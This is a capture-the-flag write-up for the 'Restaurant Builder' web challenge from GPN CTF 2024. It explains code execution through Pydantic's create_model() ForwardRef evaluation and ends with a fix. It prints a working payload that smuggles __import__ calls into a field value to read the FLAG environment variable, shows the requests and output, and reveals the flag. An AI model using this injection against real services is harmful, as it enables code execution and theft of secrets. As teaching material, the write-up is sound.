# Restaurant Builder

| Field | Details |
|-------|---------|
| **Challenge** | Restaurant Builder |
| **CTF** | GPN CTF 2024 |
| **Category** | Web |
| **Vulnerability** | Pydantic `create_model()` RCE via `ForwardRef` eval |
| **Difficulty** | Medium |
| **Flag** | `GPNCTF{anD_ONe_0r_two_Rce5_147er_7H3y_8uiLt_H4pPIlY_evEr_Af73r}` |

---

## Overview

A Flask app that lets you register dynamic Pydantic models and validate JSON against them. The `FLAG` is injected as an environment variable at container startup.

| Endpoint | Description |
|----------|-------------|
| `POST /blueprint/{name}` | Registers a dynamic Pydantic model from a `Dict[str,str]` body |
| `GET /blueprint/{name}` | Returns `model_json_schema()` |
| `POST /item/{name}` | Validates JSON against a blueprint and stores it |

---

## Vulnerability

Dict values (strings) are passed directly as `**field_definitions` to `create_model()`. Keys starting with `__` are filtered, but values are not.

In Pydantic 2.13.x, a bare string field definition is stored as a `ForwardRef` annotation. Forward refs are `eval()`'d with builtins in scope when the schema is requested. Since `__import__` is a builtin, this gives **arbitrary code execution**.

---

## Exploit

Craft an annotation that evaluates to a `Literal` type containing the flag. Pydantic renders `Literal["FLAG"]` as `{"const": "FLAG"}` in the JSON schema: the flag leaks in plaintext.

**Step 1: Register blueprint:**

```
POST /blueprint/pwn
{"flag": "__import__('typing').Literal[__import__('os').environ['FLAG']]"}
```

**Step 2: Fetch schema → flag in `const`:**

```
GET /blueprint/pwn
{"properties": {"flag": {"const": "GPNCTF{anD_ONe_0r_two_Rce5_147er_7H3y_8uiLt_H4pPIlY_evEr_Af73r}", "type": "string"}}}
```

---

## Root Cause & Fix

Never pass user-controlled strings as type annotations to `create_model()`. Fix: allowlist values to `{"str", "int", "float", "bool"}`.

---

## Flag

```
GPNCTF{anD_ONe_0r_two_Rce5_147er_7H3y_8uiLt_H4pPIlY_evEr_Af73r}
```
